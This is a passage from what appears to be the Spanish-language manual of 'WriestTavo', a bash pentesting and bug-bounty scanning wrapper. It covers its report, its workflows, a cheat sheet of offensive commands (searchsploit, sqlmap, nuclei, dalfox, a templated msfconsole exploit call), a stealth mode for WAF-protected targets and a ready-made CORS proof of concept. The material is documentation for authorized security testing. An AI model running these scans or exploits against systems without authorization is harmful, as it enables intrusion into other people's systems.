### Actualizar la Base de searchsploit

```bash
# Actualizar base de datos local de Exploit-DB
sudo searchsploit --update

# Buscar manualmente
searchsploit php rce
searchsploit wordpress 5.8 --json
searchsploit -x 12345    # leer exploit #12345
searchsploit -m 12345    # copiar exploit a directorio actual
```

---

## El Reporte HTML

Al terminar el scan, se genera un archivo `.html` interactivo en el directorio de output.

```
wriestTavo_results/
└── reporte_192_168_1_100_20241215_143022.html
```

### Secciones del Reporte

**1. Resumen Ejecutivo (para Dirección)**
- Texto no técnico con impacto de negocio
- Nivel de riesgo global con CVSS promedio
- Tres secciones: Acción Inmediata / Próximo Sprint / Backlog

**2. Dashboard de Vulnerabilidades**
- Tarjetas con conteo: Crítico / Alto / Medio / Bajo / Info
- Tarjeta CVSS Promedio del scan
- Los hallazgos CRÍTICOS y ALTOS se abren solos al cargar

**3. Contexto INTEL (Brain Box)**
- OS detectado, WAF, CMS, Framework JS, Framework Backend
- Tecnologías detectadas, servicios
- SQLi/XSS/SSRF/CORS/Docker/K8s status
- Cloud provider detectado

**4. Hallazgos Detallados**
- Filtros interactivos por severidad
- Cada hallazgo incluye:
  - Badge de severidad (CRÍTICO/ALTO/MEDIO/BAJO/INFO)
  - **CVSS score** con color (rojo ≥9, naranja ≥7, amarillo ≥4)
  - Descripción técnica
  - 🔧 **Cómo Corregir** (remediación exacta)
  - ➡️ **Siguiente Paso** (comando listo para ejecutar)

**5. Exploit Intelligence**
- Tabla EDB con links directos
- Badge MSF (Metasploit) y Verified
- CVEs NVD con CVSS y links
- GitHub Advisories

**6. Archivos Generados**
- Lista de todos los outputs: nmap, gobuster, nikto, sqlmap, etc.

---

## Flujo Completo de Trabajo

### Bug Bounty — Workflow Recomendado

```bash
# Día 1: Reconocimiento
sudo ./wriestTavo.sh --mode stealth https://target.hackerone.com
# → Seleccionar [2] Recon OSINT
# → Recolectar subdominios, emails, DNS

# Día 1: Scan web profundo (en paralelo)
sudo ./wriestTavo.sh --mode stealth https://target.hackerone.com
# → Seleccionar [4] Bug Bounty Pro

# Cuando encuentras algo interesante: agregar payload específico
sudo ./wriestTavo.sh --add-payload "PAYLOAD_DEL_WRITEUP" --payload-type sqli

# Día 2: Rescan con payloads nuevos
sudo ./wriestTavo.sh https://target.hackerone.com
# → Seleccionar [11] Custom → [13] SQLi [14] XSS [31] LFI

# Ver exploit intel del stack
sudo ./wriestTavo.sh --show-cves
```

### Pentesting Interno — Workflow

```bash
# Full scan completo
sudo ./wriestTavo.sh --mode normal 192.168.1.0/24  # o IP específica
# → Seleccionar [1] Full Scan

# Windows/AD específico
sudo ./wriestTavo.sh 192.168.1.100
# → Seleccionar [7] Windows/Infra

# Verificar infra moderna
sudo ./wriestTavo.sh 192.168.1.100
# → Seleccionar [11] Custom → [38] Docker/K8s
```

### CTF / HackTheBox — Workflow

```bash
# Máxima cobertura sin restricciones
sudo ./wriestTavo.sh --mode aggressive 10.10.10.X
# → Seleccionar [10] CTF/HTB Mode

# Ver reporte inmediatamente
firefox wriestTavo_results/reporte_*.html
```

---

## Comandos de Referencia Rápida

```bash
# ── ESCANEOS ──────────────────────────────────────────────────
sudo ./wriestTavo.sh IP_o_DOMINIO                    # Scan básico
sudo ./wriestTavo.sh https://app.example.com         # URL completa
sudo ./wriestTavo.sh --mode stealth target.com       # Modo silencioso
sudo ./wriestTavo.sh --mode aggressive 10.10.10.X    # Modo agresivo CTF
sudo ./wriestTavo.sh -o /tmp/mi_scan target.com      # Output personalizado

# ── MANTENIMIENTO ─────────────────────────────────────────────
sudo ./wriestTavo.sh --update                        # Actualizar TODO
sudo ./wriestTavo.sh --install                       # Instalar dependencias
sudo ./wriestTavo.sh --cron                          # Auto-update diario 6am
sudo ./wriestTavo.sh --show-cves                     # Ver CVEs y payloads cached

# ── PAYLOADS CUSTOM ───────────────────────────────────────────
sudo ./wriestTavo.sh --add-payload "PAYLOAD" --payload-type sqli
sudo ./wriestTavo.sh --add-payload "PAYLOAD" --payload-type xss
sudo ./wriestTavo.sh --add-payload "PAYLOAD" --payload-type lfi
sudo ./wriestTavo.sh --add-payload "PAYLOAD" --payload-type ssrf
sudo ./wriestTavo.sh --add-payload "PAYLOAD" --payload-type paths
nano ~/.wriestTavo/custom_payloads/sqli_extra.txt    # Editar directo

# ── EXPLOIT DATABASE ──────────────────────────────────────────
sudo searchsploit --update                           # Actualizar BD local
searchsploit php rce                                 # Buscar por keyword
searchsploit -x 12345                                # Leer exploit
searchsploit -m 12345                                # Copiar exploit
searchsploit wordpress 5.8 --json | jq              # JSON output

# ── MÓDULOS CUSTOM ────────────────────────────────────────────
ls ~/.wriestTavo/modules/                            # Ver módulos instalados
nano ~/.wriestTavo/modules/modulo_nuevo.sh           # Crear módulo
bash -n ~/.wriestTavo/modules/modulo_nuevo.sh        # Validar sintaxis

# ── NUCLEI ────────────────────────────────────────────────────
nuclei -update-templates                             # Actualizar templates
nuclei -l urls.txt -t cves/                          # Solo CVEs
nuclei -u https://target.com -t exposures/           # Exposures
nuclei -u https://target.com -severity critical,high # Solo alto impacto

# ── OTRAS HERRAMIENTAS INTEGRADAS ─────────────────────────────
wpscan --url https://wp-site.com --enumerate ap,at,u # WordPress audit
sqlmap -u "URL?id=1" --dbs                           # SQLi manual
dalfox url "URL?param=value"                         # XSS avanzado
arjun -u https://target.com/api                      # Params ocultos
subfinder -d target.com                              # Subdominios
```

---

## Estructura de Archivos

```
wriestTavo_results/
├── nmap/
│   ├── scan_quick.nmap          # Escaneo inicial de puertos
│   ├── scan_version.nmap        # Versiones de servicios
│   └── scan_vuln.xml            # NSE vuln scripts
├── web/
│   ├── headers_result.txt       # HTTP headers analizados
│   ├── whatweb_result.txt       # Fingerprinting tecnológico
│   ├── gobuster_result.txt      # Directorios descubiertos
│   ├── nikto_result.txt         # Nikto scan
│   ├── sqli_results.txt         # SQLi findings
│   ├── xss_results.txt          # XSS findings
│   ├── lfi_results.txt          # LFI/Path traversal
│   ├── ssrf_results.txt         # SSRF results
│   ├── cors_results.txt         # CORS misconfig
│   ├── cors_poc.html            # PoC de CSRF listo para usar
│   ├── jwt_analysis.txt         # JWT tokens analizados
│   ├── nosqli_results.txt       # NoSQLi results
│   ├── xxe_results.txt          # XXE results
│   ├── idor_redirect.txt        # IDOR + Open Redirect
│   ├── iis_windows.txt          # IIS specific tests
│   ├── http_methods.txt         # Métodos HTTP habilitados
│   └── js_analysis.txt          # Secrets en JavaScript
├── recon/
│   ├── crtsh_subdomains.txt     # Subdominios de CT logs
│   ├── theharvester_result.txt  # OSINT emails/IPs
│   ├── dnsrecon_result.txt      # DNS records
│   ├── ssl_result.txt           # SSL/TLS analysis
│   ├── nuclei_result.txt        # Nuclei findings
│   ├── framework_scan.txt       # Rutas del framework
│   ├── infra_exposure.txt       # Docker/K8s/Prometheus
│   └── exploit_intel.txt        # EDB + NVD results
├── exploits/
│   └── searchsploit_result.txt  # Exploits del stack
└── reporte_TARGET_FECHA.html    # ← REPORTE PRINCIPAL
```

```
~/.wriestTavo/                   # Directorio personal del script
├── custom_payloads/
│   ├── sqli_extra.txt           # Tus payloads SQLi
│   ├── xss_extra.txt            # Tus payloads XSS
│   ├── lfi_extra.txt            # Tus payloads LFI
│   ├── ssrf_extra.txt           # Tus payloads SSRF
│   └── paths_extra.txt          # Tus rutas custom
├── modules/
│   └── modulo_*.sh              # Tus módulos custom
├── edb_cache/
│   └── edb_*.json               # Caché EDB (24h)
├── cve_cache/
│   ├── nvd_recent.json          # CVEs últimas 48h
│   ├── nvd_*.json               # CVEs por tecnología
│   ├── exploitdb_recent.txt     # Feed EDB reciente
│   └── stack_cves_*.txt         # CVEs del último scan
└── last_update.txt              # Fecha de última actualización
```

---

## Preguntas Frecuentes

**¿Por qué no encuentra nada con `--mode stealth`?**
El modo stealth usa menos puertos y más delay. Para targets con WAF agresivo, algunos módulos se saltan automáticamente. Prueba ejecutar módulos específicos con [11] Custom.

**¿Puedo correr sin root?**
El módulo de port scan (`nmap -sS`) requiere root. Los demás módulos web funcionan sin root. Para correr sin sudo: `./wriestTavo.sh --mode normal target.com` (usará `-sT` en vez de `-sS`).

**¿searchsploit no encuentra nada?**
Actualiza la base: `sudo searchsploit --update`. La BD local tiene ~50,000 exploits pero no se actualiza sola.

**¿Por qué no se activa sqlmap?**
sqlmap (módulo 21) **solo** se activa si el módulo 13 (SQLi básico) encontró indicios y estableció `INTEL_SQLI_FOUND=true`. Esto es intencional para evitar falsos positivos y ruido.

**¿El módulo de SSRF no funciona?**
SSRF necesita URLs con parámetros. Corre primero gobuster [8] y arjun [24] para descubrir URLs con parámetros que van a `INTEL_INJECTABLE_URLS[]`. Luego corre SSRF [32].

**¿Cómo sé si el cors_poc.html funciona?**
Abre el archivo `wriestTavo_results/web/cors_poc.html` en un navegador mientras estás autenticado en el target. Si la respuesta incluye datos privados, el CORS es explotable.

**¿Puedo agregar módulos de Metasploit?**
No directamente, pero puedes crear un módulo custom que llame a `msfconsole -x "use exploit/...; set RHOSTS ${TARGET}; run"`.

**¿El script modifica el target?**
Los módulos de exploits (sqlmap, commix, dalfox) solo hacen peticiones de prueba, no modifican datos. La excepción es el test de HTTP PUT en módulo 37, que intenta subir y luego eliminar un archivo de prueba.

**¿Cuánto tarda un Full Scan?**
Depende del target. Estimaciones:
- IP local sin servicios web: ~10 min
- Dominio web completo: ~45-90 min
- WordPress con plugins: ~60-120 min
- Con `--mode stealth`: el doble de tiempo

---

*WriestTavo v4.0 — 5511 líneas · 44 módulos · 52 variables INTEL · 134 hallazgos posibles*
*Última actualización del script: ver banner al ejecutar*
